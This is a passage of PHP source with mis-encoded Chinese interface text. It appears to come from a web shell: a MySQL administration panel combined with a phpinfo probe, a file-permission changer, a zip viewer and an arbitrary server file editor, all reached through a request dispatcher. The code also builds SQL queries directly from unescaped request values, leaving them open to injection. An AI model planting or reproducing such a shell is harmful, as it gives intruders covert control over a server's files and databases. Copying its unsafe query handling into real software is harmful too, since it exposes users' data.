   <td> </td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="BIGINT"
   <? if( $type == "bigint" ) echo "checked";?>>BIGINT (-9223372036854775808 ~ 9223372036854775807)</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="FLOAT"
   <? if( $type == "float" ) echo "checked";?>>FLOAT</td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="DOUBLE"
   <? if( $type == "double" ) echo "checked";?>>DOUBLE</td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="DECIMAL"
   <? if( $type == "decimal") echo "checked";?>>DECIMAL(NUMERIC)</td>
   <td align=center>O</td>
   <td align=center>O</td>
   <td> </td>
   <td align=center>O</td>
   <td> </td></tr><tr>
   <td><input type=radio name=type value="DATE"
   <? if( $type == "date" ) echo "checked";?>>DATE (1000-01-01 ~ 9999-12-31, YYYY-MM-DD)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="DATETIME"
   <? if( $type == "datetime")
   echo "checked";?>>DATETIME (1000-01-01 00:00:00 ~ 9999-12-31 23:59:59,YYYY-MM-DD HH:MM:SS)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="TIMESTAMP"
   <? if( $type == "timestamp" )
   echo "checked";?>>TIMESTAMP (1970-01-01 00:00:00 ~ 2106..., YYYYMMDD[HH[MM[SS]]])</td>
   <td align=center>O</td>
   <td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="TIME"
   <? if( $type == "time" ) echo "checked";?>>TIME (-838:59:59 ~ 838:59:59, HH:MM:SS)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="YEAR"
   <? if( $type == "year" ) echo "checked";?>>YEAR (1901 ~ 2155, 0000, YYYY)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="CHAR"
   <? if( $type == "char" ) echo "checked";?>>CHAR</td>
   <td align=center>O</td>
   <td> </td><td> </td><td> </td><td align=center>O</td></tr><tr>
   <td><input type=radio name=type value="VARCHAR"
   <? if( $type == "varchar" ) echo "checked";?>>VARCHAR</td>
   <td align=center>O</td>
   <td> </td><td> </td><td> </td><td align=center>O</td></tr><tr>
   <td><input type=radio name=type value="TINYTEXT"
   <? if( $type == "tinytext" ) echo "checked";?>>TINYTEXT (0 ~ 255)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="TEXT"
   <? if( $type == "text" ) echo "checked";?>>TEXT (0 ~ 65535)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="MEDIUMTEXT"
   <? if( $type == "mediumtext" ) echo "checked";?>>MEDIUMTEXT (0 ~ 16777215)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="LONGTEXT"
   <? if( $type == "longtext" ) echo "checked";?>>LONGTEXT (0 ~ 4294967295)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="TINYBLOB"
   <? if( $type == "tinyblob" ) echo "checked";?>>TINYBLOB (0 ~ 255)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="BLOB"
   <? if( $type == "blob" ) echo "checked";?>>BLOB (0 ~ 65535)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="MEDIUMBLOB"
   <? if( $type == "mediumblob" ) echo "checked";?>>MEDIUMBLOB (0 ~ 16777215)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr><tr>
   <td><input type=radio name=type value="LONGBLOB"
   <? if( $type == "longblob" ) echo "checked";?>>LONGBLOB (0 ~ 4294967295)</td>
   <td> </td><td> </td><td> </td><td> </td><td> </td></tr></table><table>
   <tr><th>M</th><th>D</th><th>ÎÞ·ûºÅ</th><th>Ê¹ÓÃÁãÌî³ä</th><th>¶þ½øÖÆ¿â</th></tr><tr>
   <td align=center><input type=text size=4 name=M
   <? if( $M != "" ) echo "value=$M";?>></td>
   <td align=center><input type=text size=4 name=D
   <? if( $D != "" ) echo "value=$D";?>></td>
   <td align=center><input type=checkbox name=unsigned value="UNSIGNED"
   <? if( strpos( $fieldtype, "unsigned" ) ) echo "checked";?>></td>
   <td align=center><input type=checkbox name=zerofill value="ZEROFILL"
   <? if(strpos( $fieldtype, "zerofill" ) ) echo "checked";?>></td>
   <td align=center><input type=checkbox name=binary value="BINARY"
   <? if( strpos( $fieldtype, "binary" ) ) echo "checked";?>></td>
   </tr></table>
   <h3>ÌØÕ÷</h3>
   <table>
   <tr><th>·Ç¿Õ</th><th>È±Ê¡Öµ</th><th>×Ô¶¯ÔöÁ¿</th><th>Ö÷¼ü</th></tr>
   <tr>
   <td align=center><input type=checkbox name=not_null value="NOT NULL"
   <? if($fieldnull != "YES" ) echo "checked";?>></td>
   <td align=center><input type=text name=default_value
   <? if( $fielddefault!= "" ) echo "value=$fielddefault";?>></td>
   <td align=center><input type=checkbox name=auto_increment value="AUTO_INCREMENT"
   <? if( $fieldextra == "auto_increment" ) echo "checked";?>></td>
   <td align=center><input type=checkbox name=primary_key value="PRIMARY KEY"
   <? if( $fieldkey == "PRI" ) echo "checked";?>></td>
   </tr></table>
   <p>
   <?
   if( $cmd == "add" )
   echo "<input type=submit value='Ìí¼Ó×Ö¶Î'>\n";
   else if( $cmd == "edit" )
   echo "<input type=submit value='±à¼×Ö¶Î'>\n";
   echo "<input type=button value=È¡Ïû onClick='history.back()'>\n";
   echo "</form>\n";
   }
   function manageField_submit( $cmd ) {
   global $mysqlHandle, $dbname, $tablename, $old_name, $name, $type, $PHP_SELF, $queryStr, $errMsg,
   $M, $D, $unsigned, $zerofill, $binary, $not_null, $default_value, $auto_increment, $primary_key;
   if( $cmd == "add" ) $queryStr = "ALTER TABLE $tablename ADD $name ";
   else if( $cmd == "edit" )
   $queryStr = "ALTER TABLE $tablename CHANGE $old_name $name ";
   if( $M != "" )
   if( $D != "" ) $queryStr .= "$type($M,$D) ";
   else $queryStr .= "$type($M) ";
   else $queryStr .= "$type ";
   $queryStr .= "$unsigned $zerofill $binary ";
   if( $default_value != "" ) $queryStr .= "DEFAULT '$default_value' ";
   $queryStr .= "$not_null $auto_increment";
   mysql_select_db( $dbname, $mysqlHandle );
   mysql_query( $queryStr, $mysqlHandle );
   $errMsg = mysql_error();
   $keyChange = false;
   $result = mysql_query( "SHOW KEYS FROM $tablename" );
   $primary = "";
   while( $row = mysql_fetch_array($result) )
   if( $row[ "Key_name"] == "PRIMARY" ) {
   if( $row[Column_name] == $name ) $keyChange = true;
   else $primary .= ", $row[Column_name]";
   }
   if( $primary_key == "PRIMARY KEY" ) {
   $primary .= ", $name";
   $keyChange = !$keyChange;
   }
   $primary = substr( $primary, 2 );
   if( $keyChange == true ) {
   $q = "ALTER TABLE $tablename DROP PRIMARY KEY";
   mysql_query( $q );
   $queryStr .= "<br>\n" . $q;
   $errMsg .= "<br>\n" . mysql_error();
   $q = "ALTER TABLE $tablename ADD PRIMARY KEY( $primary )";
   mysql_query( $q );
   $queryStr .= "<br>\n" . $q;
   $errMsg .= "<br>\n" . mysql_error();
   }
   viewSchema();
   }
   function dropField() {
   global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
   $queryStr = "ALTER TABLE $tablename DROP COLUMN $fieldname";
   mysql_select_db( $dbname, $mysqlHandle );
   mysql_query( $queryStr , $mysqlHandle );
   $errMsg = mysql_error();
   viewSchema();
   }
   function viewData( $queryStr ) {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF, $errMsg, $start ,$hole;;
   echo "<h1>Êý¾Ý¿â±íÖÐµÄÊý¾Ý</h1><table><tr>\n";
   if( $tablename != "" ) echo "<p class=location>$dbname >$tablename</p>\n";
   else echo "<p class=location>$dbname</p>\n";
   echoQueryResult();
   $queryStr = stripslashes( $queryStr );
   if( $queryStr == "" ) {
   if(!isset($start)) {$start=0;$hole=30;}
   $queryStr = "SELECT * FROM $tablename LIMIT $start,$hole";
   echo "</tr><tr><a href='$PHP_SELF?tools=mysql&action=addData&dbname=$dbname&tablename=$tablename'>Ìí¼ÓÊý¾Ý</a> | \n";
   echo "<a href='$PHP_SELF?tools=mysql&action=viewSchema&dbname=$dbname&tablename=$tablename'>½á¹¹</a></tr>\n";
   echo "<tr><td><form action='$PHP_SELF'><input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=viewData>\n";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=hidden name=tablename value=$tablename>\n";
   echo "¿ªÊ¼Êý<input type=text name=start size=\"3\" value=\"";
   echo$start;
   echo "\">\nÏÔÊ¾Êý<input type=text size=\"3\" name=hole value=$hole>";
   echo "<input type=submit value='ÏÔÊ¾Êý¾Ý'>\n";
   echo "</form></td>\n";
   echo "<td><form action='$PHP_SELF'><input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=viewData>\n";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=hidden name=tablename value=$tablename>\n";
   echo "<input type=hidden name=start value=\"";
   echo$start-$hole;
   echo "\">\n<input type=hidden name=hole value=$hole>";
   echo "<input type=submit value='<<'>\n";
   echo "</form></td>\n";
   echo "<td><form action='$PHP_SELF'><input type=hidden name=tools value=mysql>\n";
   echo "<input type=hidden name=action value=viewData>\n";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=hidden name=tablename value=$tablename>\n";
   echo "<input type=hidden name=start value=\"";
   echo$start+$hole;
   echo "\">\n<input type=hidden name=hole value=$hole>";
   echo "<input type=submit value='>>'>\n";
   echo "</form></td></tr></table>\n";
   } else echo "Query : $queryStr<br>";
   $pResult = mysql_db_query( $dbname, $queryStr );
   $errMsg = mysql_error();
   $GLOBALS[queryStr] = $queryStr;
   echo "<hr>\n";
   if( $errMsg != "" ) echoQueryResult();
   if( $pResult == false ) return;
   if( $pResult == 1 ) {
   echo "<h2>²Ù×÷³É¹¦£¡</h2><p>";
   return;
   }
   $row = mysql_num_rows( $pResult );
   $col = mysql_num_fields( $pResult );
   echo "<table cellspacing=1 cellpadding=2>\n";
   echo "<tr>\n";
   for( $i = 0; $i < $col; $i++ ) {
   $field = mysql_fetch_field( $pResult, $i );
   echo "<th>".$field->name. "</th>\n";
   }
   echo "<th colspan=2>²Ù×÷</th>\n";
   echo "</tr>\n";
   for( $i = 0; $i < $row; $i++ ) {
   echo "<tr>\n";
   $rowArray = mysql_fetch_row( $pResult );
   $key = "";
   for( $j = 0; $j < $col; $j++ ) {
   $data = $rowArray[$j];
   $field = mysql_fetch_field( $pResult, $j );
   if( $field->primary_key == 1 )
   $key .= "&" . $field->name . "=" . $data;
   if( strlen( $data ) > 20 )
   $data = substr( $data, 0, 20 ) . "...";
   $data = htmlspecialchars( $data );
   echo "<td>\n";
   echo "$data\n";
   echo "</td>\n";
   }
   if( $key == "" ) echo "<td colspan=2>Ã»ÓÐÖ÷¼ü</td>\n";
   else {
   echo "<td><a href='$PHP_SELF?tools=mysql&action=editData&dbname=$dbname&tablename=$tablename$key'>±à¼</a></td>\n";
   echo "<td><a href='$PHP_SELF?tools=mysql&action=deleteData&dbname=$dbname&tablename=$tablename$key' ";
   echo "onClick=\"return confirm('Delete Row?')\">É¾³ý</a></td>\n";
   }
   echo "</tr>\n";
   }
   echo "</table>\n";
   }
   function manageData( $cmd ) {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF;
   if( $cmd == "add" )
   echo "<h1>Ìí¼ÓÊý¾Ý</h1>\n";
   else if( $cmd == "edit" ) {
   echo "<h1>±à¼Êý¾Ý</h1>\n";
   $pResult = mysql_list_fields( $dbname, $tablename );
   $num = mysql_num_fields( $pResult );
   $key = "";
   for( $i = 0; $i < $num; $i++ ) {
   $field = mysql_fetch_field( $pResult, $i );
   if( $field->primary_key == 1 )
   if( $field->numeric == 1 )
   $key .= $field->name."=".$GLOBALS[$field->name]." AND ";
   else
   $key .= $field->name."='".$GLOBALS[$field->name]."' AND ";
   }
   $key = substr( $key, 0, strlen($key)-4 );
   mysql_select_db( $dbname, $mysqlHandle );
   $pResult = mysql_query( $queryStr = "SELECT * FROM $tablename WHERE $key", $mysqlHandle );
   $data = mysql_fetch_array( $pResult );
   }
   echo "<p class=location>$dbname > $tablename</p>\n";
   echo "<form action='$PHP_SELF' method=post><input type=hidden name=tools value=mysql>\n";
   if($cmd=="add")echo "<input type=hidden name=action value=addData_submit>";
   else if($cmd=="edit")
   echo "<input type=hidden name=action value=editData_submit>";
   echo "<input type=hidden name=dbname value=$dbname>\n";
   echo "<input type=hidden name=tablename value=$tablename>\n";
   echo "<table cellspacing=1 cellpadding=2>\n";
   echo "<tr>\n";
   echo "<th>×Ö¶ÎÃû³Æ</th>\n";
   echo "<th>×Ö¶ÎÀàÐÍ</th>\n";
   echo "<th>Ê¹ÓÃº¯Êý</th>\n";
   echo "<th>Êý¾Ý</th>\n";
   echo "</tr>\n";
   $pResult = mysql_db_query( $dbname,"SHOW fields FROM $tablename" );
   $num = mysql_num_rows( $pResult );
   $pResultLen = mysql_list_fields( $dbname, $tablename );
   for( $i = 0; $i < $num; $i++ ) {
   $field = mysql_fetch_array( $pResult );
   $fieldname = $field[ "Field"];
   $fieldtype = $field[ "Type"];
   $len = mysql_field_len( $pResultLen, $i );
   echo "<tr>";
   echo "<td>$fieldname</td>";
   echo "<td>".$field[ "Type"]. "</td>";
   echo "<td>\n";
   echo "<select name=${fieldname}_function>\n";
   echo "<option><option>ASCII<option>CHAR<option>SOUNDEX\n";
   echo "<option>CURDATE<option>CURTIME<option>FROM_DAYS\n";
   echo "<option>FROM_UNIXTIME<option>NOW<option>PASSWORD\n";
   echo "<option>PERIOD_ADD<option>PERIOD_DIFF<option>TO_DAYS\n";
   echo "<option>USER<option>WEEKDAY<option>RAND</select>\n";
   echo "</td>\n";
   $value = htmlspecialchars($data[$i]);
   if( $cmd == "add" ) {
   $type = strtok( $fieldtype, " (,)\n" );
   if( $type == "enum" || $type == "set" ) {
   echo "<td>\n";
   if( $type == "enum" ) echo "<select name=$fieldname>";
   else if( $type == "set" )
   echo "<select name=$fieldname size=4 multiple>\n";
   echo strtok( "'" );
   while( $str = strtok( "'" ) ) {
   echo "<option>$str\n";
   strtok( "'" );
   }
   echo "</select>\n";
   echo "</td>\n";
   } else {
   if( $len < 40 )
   echo "<td><input type=text size=40 maxlength=$len name=$fieldname></td>\n";
   else
   echo "<td><textarea cols=40 rows=3 maxlength=$len name=$fieldname></textarea>";
   }
   } else if( $cmd == "edit" ) {
   if( $len < 40 )
   echo "<td><input type=text size=40 maxlength=$len name=$fieldname value=$value></td>\n";
   else
   echo "<td><textarea cols=40 rows=3 maxlength=$len name=$fieldname>$value</textarea>\n";
   }
   echo "</tr>";
   }
   echo "</table><p>\n";
   if( $cmd == "add" ) echo "<input type=submit value='Ìí¼ÓÊý¾Ý'>";
   else if( $cmd == "edit" ) echo "<input type=submit value='±à¼Êý¾Ý'>";
   echo "<input type=button value='È¡Ïû' onClick='history.back()'>\n";
   echo "</form>\n";
   }
   function manageData_submit( $cmd ) {
   global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
   $pResult = mysql_list_fields( $dbname, $tablename );
   $num = mysql_num_fields( $pResult );
   mysql_select_db( $dbname, $mysqlHandle );
   if( $cmd == "add" ) $queryStr = "INSERT INTO $tablename VALUES (";
   else if( $cmd == "edit" ) $queryStr = "REPLACE INTO $tablename VALUES (";
   for( $i = 0; $i < $num-1; $i++ ) {
   $field = mysql_fetch_field( $pResult );
   $func = $GLOBALS[$field->name. "_function"];
   if( $func != "" ) $queryStr .= " $func(";
   if( $field->numeric == 1 ) {
   $queryStr .= $GLOBALS[$field->name];
   if( $func != "" ) $queryStr .= "),";
   else $queryStr .= ",";
   } else {
   $queryStr .= "'" . $GLOBALS[$field->name];
   if( $func != "" ) $queryStr .= "'),";
   else $queryStr .= "',";
   }
   }
   $field = mysql_fetch_field( $pResult );
   if( $field->numeric == 1 ) $queryStr .= $GLOBALS[$field->name] . ")";
   else $queryStr .= "'" . $GLOBALS[$field->name] . "')";
   mysql_query( $queryStr , $mysqlHandle );
   $errMsg = mysql_error();
   viewData( "" );
   }
   function deleteData() {
   global $mysqlHandle, $dbname, $tablename, $fieldname, $PHP_SELF, $queryStr, $errMsg;
   $pResult = mysql_list_fields( $dbname, $tablename );
   $num = mysql_num_fields( $pResult );
   $key = "";
   for( $i = 0; $i < $num; $i++ ) {
   $field = mysql_fetch_field( $pResult, $i );
   if( $field->primary_key == 1 )
   if( $field->numeric == 1 )
   $key .= $field->name."=".$GLOBALS[$field->name]."AND ";
   else
   $key .= $field->name."='".$GLOBALS[$field->name]."' AND ";
   }
   $key = substr( $key, 0, strlen($key)-4 );
   mysql_select_db( $dbname, $mysqlHandle );
   $queryStr = "DELETE FROM $tablename WHERE $key";
   mysql_query( $queryStr, $mysqlHandle );
   $errMsg = mysql_error();
   viewData( "" );
   }
   function header_html() { global $PHP_SELF; ?>
   <html><head><title>Êý¾Ý¿â¹ÜÀí½çÃæ</title>
   <style type="text/css">
   <!--
   p.location {
   color: #11bb33;
   font-size: small;
   }
   h1 {
   color: #A4A260;
   }
   th {
   background-color: #BDBE42;
   color: #FFFFFF;
   font-size: x-small;
   }
   td {
   background-color: #DEDFA5;
   font-size: x-small;
   }
   a{
   text-decoration:none;
   color: #848200;
   font-size:x-small;
   }
   //-->
   </style></head><body>
   <?
   }
   function footer_html() {
   global $mysqlHandle, $dbname, $tablename, $PHP_SELF;
   ?>
   <hr>
   <font size=2>
   <a href=" <? echo "$PHP_SELF"; ?>?tools=mysql&action=listDBs">Êý¾Ý¿âÁÐ±í</a> |
   <?
   if( $tablename != "" )
   echo "<a href='$PHP_SELF?tools=mysql&action=listTables&dbname=$dbname&tablename=$tablename'>ÏÔÊ¾Êý¾Ý¿â±íÁÐ±í</a> | ";
   ?>
   <a href=" <? echo "$PHP_SELF"; ?>?tools=mysql&action=logout">ÍË³ö</a>
   </font></body></html>
   <?
   }
   if( $action == "logon" || $action == "" || $action == "logout" ) logon();
   elseif($action != "logon_submit")
   {
   $mysqlHandle = mysql_pconnect($zoom, $USERNAME, $PASSWORD );
   if( $mysqlHandle == false ) {
   echo "<html><head><title>¹ÜÀíÔ±Êý¾Ý¿â¹ÜÀí½çÃæ</title></head>\n";
   echo "<body>\n";
   echo "<table width=100% height=100%><tr><td><center>\n";
   echo "<h1>ÊäÈë´íÎó£¬ÎÞ·¨Á¬½ÓÊý¾Ý¿â£¡</h1>\n";
   echo "<a href='$PHP_SELF?tools=mysql&action=logon'>ÍË³ö</a>\n";
   echo "</center></td></tr></table></body></html>";
   } else {
   header_html();
   if( $action == "listDBs" ) listDatabases();
   else if( $action == "createDB" ) createDatabase();
   else if( $action == "dropDB" ) dropDatabase();
   else if( $action == "listTables" ) listTables();
   else if( $action == "createTable" ) createTable();
   else if( $action == "dropTable" ) dropTable();
   else if( $action == "viewSchema" ) viewSchema();
   else if( $action == "query" ) viewData( $queryStr );
   else if( $action == "addField" ) manageField( "add" );
   else if( $action == "addField_submit" ) manageField_submit( "add" );
   else if( $action == "editField" ) manageField( "edit" );
   else if( $action == "editField_submit" ) manageField_submit( "edit" );
   else if( $action == "dropField" ) dropField();
   else if( $action == "viewData" ) viewData( "" );
   else if( $action == "addData" ) manageData( "add" );
   else if( $action == "addData_submit" ) manageData_submit( "add" );
   else if( $action == "editData" ) manageData( "edit" );
   else if( $action == "editData_submit" ) manageData_submit("edit");
   else if( $action == "deleteData" ) deleteData();
   footer_html();
   } }
   ?>
   <?
          echo"</td></tr></table>";
   }
   elseif($tools==env) { //phpÌ½Õë
              echo"<table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\">";
              echo"<tr><td class=\"t11\">phpÌ½Õë:</tr><tr><td class=\"t12\">";
              phpinfo();
             echo"</td></tr></table>";
   }
   //***************************************************************************************************
   elseif($tools==editfileperm) //±à¼ÎÄ¼þÊôÐÔ
   {
       $perm=substr(base_convert(fileperms("$dir/$fileperm"),10,8),-4);
       echo"<table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\"> <form method=\"post\" action=\"?dir=$dir&fileperm=$fileperm\"> <tr><td class=\"t11\" height=\"5\">ÎÄ¼þÊôÐÔÐÞ¸Ä <a href=\"?dir=$dir\"><font color=#ffffff> ·µ»Ø</font></a> </td></tr> <tr><td class=\"t12\" height=\"7\"> $fileperm ÎÄ¼þÊôÐÔÎª: <input type=\"text\" name=\"perming\" value=\"$perm\"> <input type=\"submit\" name=\"editperm\" value=\"ÐÞ¸Ä\"> <input type=\"reset\" value=\"ÖØÖÃ\"> ÇëÌîÐÂµÃÎÄ¼þÊôÐÔ¡£Èç: 0777.0755.0666.0644.0600µÈ</td> </tr></form></table>";
   }
   elseif($action=="viewzip"){
       $zip = new Zip;
       $l=$zip->get_list($dir."/".$file[0]);
       echo "<h2 align=\"center\">ZipÎÄ¼þä¯ÀÀ | $file[0] <a href=\"?dir=$dir\">·µ»Ø</a></h2><table class=\"t1\" width=\"750\" cellspacing=\"1\" cellpadding=\"1\"><tr class=\"t22\"><td><b>ÎÄ¼þÃû</b></td><td width=130><b>Â·¾¶</b></td><td width=120><b>Êµ¼Ê´óÐ¡</b></td><td width=120><b>Ñ¹Ëõ´óÐ¡</td><td width=90><b>Ñ¹ËõÂÊ</b></td></tr>";
       for($k=0;isset($l[$k]);$k++){
           $h=$l[$k];
           $name=$h[stored_filename];
           $isdir=$h[folder];
           $id=$h[index];
           $sub="";
           $mdir = dirname($name)."/";
           if(!$h[folder]){
               $s=$h[size];
               $cs=$h[compressed_size];
               $un="Bytes";
               $uni="Bytes";
               $ext=strtolower(substr($name,-4));
               if($ext==".gif"||$ext==".jpg"||$ext==".png"||$ext==".bmp"){}
               $ratio=@intval($cs/($s/100)+0,00001);
               if($s>1000){$s=substr($s/1000,0,5); $un="Kb"; }
               if($s>1000){$s=substr($s/1000,0,5); $un="Mb"; }
               if($s>1000){$s=substr($s/1000,0,5); $un="Gb"; }
               if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Kb"; }
               if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Mb"; }
               if($cs>1000){$cs=substr($cs/1000,0,5); $uni="Gb"; }
               echo "<tr style=\"background:#fefefe;\"><td>$name</td><td>$sub$mdir</td><td align=center>$s$un</td><td align=center>$cs$uni</td><td align=center>$ratio %</td></tr>";
           }
       }
       if($k==0){
           echo "<tr><td colspan=7 align=center><b>= ¿ÕµÄZIPÎÄ¼þ =</b></td></tr>";
       }
       echo "</table>";
   }
   else{
       if($dir=="") $dir=".";
       if (($editfile!=""&&$job!='copy'&&$n=='1')||($action=="newfile"&&$job!='copy'))//±à¼ÎÄ¼þ´°¿Ú
       {
           if($key==""){
               $filename = "$dir/$editfile";
               $fd = fopen( $filename, "r" );
               $contents = @fread($fd, filesize($filename));
               fclose( $fd );
               $contents= str_replace("/textarea>",htmlspecialchars("/textarea>"),$contents);
           }else{
               $editfile=$key;
               $filename = "$dir/$editfile";
           }
           echo"<table width=750 cellspacing=1 cellpadding=1> <form name=edit method=post action=> <tr> <td class=t11> µ±Ç°ÎÄ¼þÃû: <input type=text name=editfilename value=$editfile>¿ÉÒÔÔÚ´ËÐÞ¸ÄÎÄ¼þÃû  <a href=?dir=$dir><font color=#ffffff>·µ»Ø</font></a>  </td></tr><tr> <td> ¸´ÖÆ:<input type=checkbox name=copy value=1>×¢Òâ£ºÑ¡ÖÐ¸´ÖÆºó£¬Ðè¸øÐÂµÄÎÄ¼þ¸ÄÃû£¬ÔÎÄ¼þÄÚÈÝ²»»á±ä£¡ <input type=hidden name=job value=copy> </td></tr><tr> <td class=t11> <textarea name=editfiletxt cols=121 rows=30>$contents</textarea>  </td></tr><tr> <td align=center> <input type=submit value=Ìá½»>
   <input type=reset value=ÖØÖÃ></td></tr> </form></table>";
       }
       else {
           $path="";
           $pathname=str_replace('\\','/',dirname(__FILE__));
           echo "<table class=t1 width=750 cellspacing=1 cellpadding=1> <tr> <td width=100%>";?><a href=?dir=./>#Ê×Ò³</a>
   <div id=overDiv style="LEFT: 20px; POSITION: absolute; Z-INDEX: 1; visibility: hidden; top: 64px" 42px;37px
   14px;top:2px> </div>
                     <script language=JavaScript>
       if (typeof fcolor == 'undefined') { var fcolor = "#FFFFFF";}
       if (typeof backcolor == 'undefined') { var backcolor = "#0000FF";}
       if (typeof textcolor == 'undefined') { var textcolor = "#000000";}
       if (typeof capcolor == 'undefined') { var capcolor = "#FFFF00";}
       if (typeof closecolor == 'undefined') { var closecolor = "#9999FF";}
       if (typeof width == 'undefined') { var width = "200";}
       if (typeof border == 'undefined') { var border = "1";}
       if (typeof offsetx == 'undefined') { var offsetx = 10;}
       if (typeof offsety == 'undefined') { var offsety = 10;}
   ns4 = (document.layers)? true:false
   ie4 = (document.all)? true:false
   if (ie4) {
       if (navigator.userAgent.indexOf('MSIE 5')>0) {
           ie5 = true;
       } else {
           ie5 = false; }
   } else {
       ie5 = false;
   }
   var x = 0;
   var y = 0;
   var snow = 0;
   var sw = 0;
   var cnt = 0;
   var dir = 1;
   var tr = 1;
   if ( (ns4) || (ie4) ) {
       if (ns4) over = document.overDiv
       if (ie4) over = overDiv.style
       document.onmousemove = mouseMove
       if (ns4) document.captureEvents(Event.MOUSEMOVE)
   }
   function drs(text) {
       dts(1,text);
   }
   function drc(text, title) {
       dtc(1,text,title);
   }
   function src(text,title) {
       stc(1,text,title);
   }
   function dls(text) {
       dts(0,text);
   }
   function dlc(text, title) {
       dtc(0,text,title);
   }
   function slc(text,title) {
       stc(0,text,title);
   }
   function dcs(text) {
       dts(2,text);
   }
   function dcc(text, title) {
       dtc(2,text,title);
   }
   function scc(text,title) {
       stc(2,text,title);
   }
   function nd() {
       if ( cnt >= 1 ) { sw = 0 };
       if ( (ns4) || (ie4) ) {
           if ( sw == 0 ) {
               snow = 0;
               hideObject(over);
           } else {
               cnt++;
           }
       }
   }
   function dts(d,text) {
       txt = "<TABLE WIDTH="+width+" BORDER=0 CELLPADDING="+border+" CELLSPACING=0 BGCOLOR=\""+backcolor+"\"><TR><TD><TABLE WIDTH=100% BORDER=0 CELLPADDING=2 CELLSPACING=0 BGCOLOR=\""+fcolor+"\"><TR><TD><FONT FACE=\"Arial,Helvetica\" COLOR=\""+textcolor+"\" SIZE=\"-2\">"+text+"</FONT></TD></TR></TABLE></TD></TR></TABLE>"
       layerWrite(txt);
       dir = d;
       disp();
   }
   function dtc(d,text, title) {
       txt = "<TABLE WIDTH="+width+" BORDER=0 CELLPADDING="+border+" CELLSPACING=0 BGCOLOR=\""+backcolor+"\"><TR><TD><TABLE WIDTH=100% BORDER=0 CELLPADDING=0 CELLSPACING=0><TR><TD><SPAN ID=\"PTT\"><FONT COLOR=\""+capcolor+"\">"+title+"</FONT></SPAN></TD></TR></TABLE><TABLE WIDTH=100% BORDER=0 CELLPADDING=2 CELLSPACING=0 BGCOLOR=\""+fcolor+"\"><TR><TD><SPAN ID=\"PST\"><FONT COLOR=\""+textcolor+"\">"+text+"</FONT><SPAN></TD></TR></TABLE></TD></TR></TABLE>"
       layerWrite(txt);
       dir = d;
       disp();
   }
   function stc(d,text, title) {
       sw = 1;
       cnt = 0;
       txt = "<TABLE WIDTH="+width+" BORDER=0 CELLPADDING="+border+" CELLSPACING=0 BGCOLOR=\""+backcolor+"\"><TR><TD><TABLE WIDTH=100% BORDER=0 CELLPADDING=0 CELLSPACING=0><TR><TD><SPAN ID=\"PTT\"><FONT COLOR=\""+capcolor+"\">"+title+"</FONT></SPAN></TD><TD ALIGN=RIGHT><A HREF=\"/\" onMouseOver=\"cClick();\" ID=\"PCL\"><FONT COLOR=\""+closecolor+"\">Close</FONT></A></TD></TR></TABLE><TABLE WIDTH=100% BORDER=0 CELLPADDING=2 CELLSPACING=0 BGCOLOR=\""+fcolor+"\"><TR><TD><SPAN ID=\"PST\"><FONT COLOR=\""+textcolor+"\">"+text+"</FONT><SPAN></TD></TR></TABLE></TD></TR></TABLE>"
       layerWrite(txt);
       dir = d;
       disp();
       snow = 0;
   }
   function disp() {
       if ( (ns4) || (ie4) ) {
           if (snow == 0)  {
               if (dir == 2) { // Center
                   moveTo(over,x+offsetx-(width/2),y+offsety);
               }
               if (dir == 1) { // Right
                   moveTo(over,x+offsetx,y+offsety);
               }
               if (dir == 0) { // Left
                   moveTo(over,x-offsetx-width,y+offsety);
               }
               showObject(over);
               snow = 1;
           }
       }
   }
   function mouseMove(e) {
       if (ns4) {x=e.pageX; y=e.pageY;}
       if (ie4) {x=event.x; y=event.y;}
       if (ie5) {x=event.x+document.body.scrollLeft; y=event.y+document.body.scrollTop;}
       if (snow) {
           if (dir == 2) { // Center
               moveTo(over,x+offsetx-(width/2),y+offsety);
           }
           if (dir == 1) { // Right
               moveTo(over,x+offsetx,y+offsety);
           }
           if (dir == 0) { // Left
               moveTo(over,x-offsetx-width,y+offsety);
           }
       }
   }
   function cClick() {
       hideObject(over);
       sw=0;
   }
   function layerWrite(txt) {
           if (ns4) {
                   var lyr = document.overDiv.document
